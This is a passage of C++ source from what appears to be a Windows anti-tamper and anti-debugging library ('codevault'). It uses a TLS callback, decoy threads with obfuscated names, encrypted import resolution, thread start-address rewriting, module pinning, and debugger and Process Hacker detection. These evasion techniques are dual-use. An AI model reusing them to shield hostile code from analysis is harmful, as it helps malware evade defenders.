        if (integrityChecker.compare_to_initial_checksum()) { flag = Encrypt(1); HandleAttack(Encrypt("Application Tampering"), Encrypt(1)); } Imports.get_function<BOOL(*)(WNDENUMPROC, LPARAM)>(Encrypt("user32.dll"), Encrypt("EnumWindows"))(codevault_Module, Encrypt(0));
        BreakDebuggers(); CheckOperatingSystem(); DetectProcessHacker();
        Imports.check_api_calls(); Check_Threads(); CheckDebugInfoIntegrity();
    }
}


VOID CALLBACK MyAPCFunc(ULONG_PTR dwParam)
{
    Hide_Function();

    Hide_Function_End();
}

struct ThreadData
{
    codevaultFunction func2;
};


DWORD WINAPI ThreadpoolCallback(LPVOID lpParameter) 
{
    Hide_Function();
    ThreadData* data = static_cast<ThreadData*>(lpParameter);
    data->func2();
    return 0;
    Hide_Function_End();
}

DWORD WINAPI codevault_切都将变得毫无乐趣和更多变得爱得毫无变得毫变得得(LPVOID lpParam)
{
    Hide_Function(); 
    Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    return Encrypt(0x99c);;
    Hide_Function_End();
}


DWORD WINAPI codevault_这个该死的文本切都将变得毫无乐趣和更多的爱(LPVOID lpParam)
{
    Thread1 = Imports.get_current_thread();
      DWORD oldProtect;
    time1 = Imports.get_tick_count64();
    thread1_started = true;
    for (;;)
    {
        time1 = Imports.get_tick_count64(); 
        CheckDebugger(1); 
        Wait(Encrypt(2000));
    }
    return Encrypt(0x99c);;
}

DWORD WINAPI codevault_乐趣和更多的爱(LPVOID lpParam)
{
    Hide_Function(); 
    for (;;)
    {
        int time35 = Imports.get_tick_count64();
        if (time1 == Encrypt(0))
        {
            if (start2 > Encrypt(0)) { if (Imports.get_tick_count64() - start2 > Encrypt(15000) && !authorized) { HandleAttack(Encrypt("codevault_Protect Not Called Within 15s Of Fake Entrypoint Running"), Encrypt(0)); } }
            CheckDebugger(0);
            Wait(Encrypt(2000));
        }
        else
        {
            Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
            Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
            Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
            Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
            Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
            Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
        }
    }
    return Encrypt(0x99c);
    Hide_Function_End();
}

DWORD WINAPI 乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱(LPVOID lpParam)
{
    Hide_Function();  
    for (;;)
    {
        Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    }
    return Encrypt(0x99c);
    Hide_Function_End();
}



void ChangeThreadStartAddress(HANDLE hThread, LPVOID newStartAddress)
{
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    DWORD suspendCount = Lazy(SuspendThread).get()(hThread);
    Lazy(GetThreadContext).get()(hThread, &context);
    context.Rip = reinterpret_cast<ULONG_PTR>(newStartAddress);
    InitialRip = reinterpret_cast<ULONG_PTR>(newStartAddress);
    Lazy(SetThreadContext).get()(hThread, &context);
    Lazy(ResumeThread).get()(hThread);
}

auto 的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更()
{
    for (;;)
    {
        Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
        Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
        Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
        Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
        Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
        Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000)); Wait(Encrypt(200000000000000));
    }
}

secure auto Secure_Create_Thread(void* function, HANDLE Base)
{
    Base = Imports.get_function<HANDLE(*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)>(Encrypt("kernel32.dll"), Encrypt("CreateThread"))(nullptr, Encrypt(0), reinterpret_cast<LPTHREAD_START_ROUTINE>(function), nullptr, Encrypt(0), nullptr);
    Protected_Threads.push_back(Lazy(GetThreadId).get()(Base));
    if (!IsThreadRunning) { Imports.exit_application(); }

}

secure auto Initialize_Threads()
{
    thread_starter_called = Encrypt(1);


    if (tls_ran && main_called)
    {
        HANDLE e1 = 0;
        HANDLE e2 = 0;
        srand(static_cast<unsigned>(time(nullptr)));
        for (int i = Encrypt(0); i < Encrypt(3); ++i)
        {
            Secure_Create_Thread(&的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更, e1);  Protect_Thread(e1);
        }
        Secure_Create_Thread(&codevault_这个该死的文本切都将变得毫无乐趣和更多的爱, Thread1); Protect_Thread(Thread1);
        for (int i = Encrypt(0); i < Encrypt(3); ++i)
        {
            Secure_Create_Thread(&的爱乐趣和更多的爱乐趣和更多的爱乐趣和更多的爱乐趣和更, e2); Protect_Thread(e2);
        }
        Wait(Encrypt(1000));
        if (thread1_started && time1 > Encrypt(0))
        {

        }
        else
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Libary Tampering #7"), Encrypt(1));
        }
    }
    else
    {
        flag = Encrypt(1); flag = Encrypt(1); HandleAttack(Encrypt("Libary Tampering #6"), Encrypt(1));
    }
}

extern "C" __declspec(noinline) void HookFunction()
{
    Hide_Function();
    HANDLE Thread2 = Create_Hashed(NULL, Encrypt(0), Encrypt(&codevault_乐趣和更多的爱), NULL, Encrypt(0), NULL); Protect_Thread(Thread2);
    Hide_Function_End();
}

DWORD GetProcessID(const char* processName)
{
    DWORD processID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32))
    {
        do
        {
            if (_stricmp(pe32.szExeFile, processName) == 0)
            {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return processID;
}


void NTAPI __stdcall TempTls(PVOID pHandle, DWORD dwReason, PVOID Reserved)
{
    Hide_Function();
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        tls_ran = Encrypt(1); HookFunction(); CheckDebugger(1);
    }

    if (dwReason == DLL_THREAD_ATTACH)
    {
        if (!imgui)
        {
            Check_Threads(); 
        }
    }

    if (dwReason == DLL_THREAD_DETACH)
    {
        if (!imgui)
        {
            Check_Threads(); 
        }
    }

    if (dwReason == DLL_PROCESS_DETACH)
    {
        if (!imgui)
        {
            Check_Threads(); 
        }
    }
    Hide_Function_End();
}


void PreventUnload()
{
    Hide_Function();
    HMODULE thisModule = NULL; MEMORY_BASIC_INFORMATION mbi = { 0 }; DWORD oldProtect;
    Imports.get_function<BOOL(*)(DWORD, LPCSTR, HMODULE*)>(Encrypt("kernel32.dll"), Encrypt("GetModuleHandleExA"))(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_PIN, reinterpret_cast<LPCSTR>((&TempTls)), &thisModule);
    Imports.virtual_query(reinterpret_cast<void*>((&TempTls)), &mbi, sizeof(mbi)); Imports.virtual_protect(mbi.BaseAddress, mbi.RegionSize, PAGE_GUARD, &oldProtect);
    Hide_Function_End();
}

#ifdef _WIN64
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:tls_callback_func")
#pragma const_seg(".CRT$XLF")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_func = TempTls;
#pragma const_seg()
#else
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:_tls_callback_func")
#pragma data_seg(".CRT$XLF")
EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_func = TempTls;
#pragma data_seg()
#endif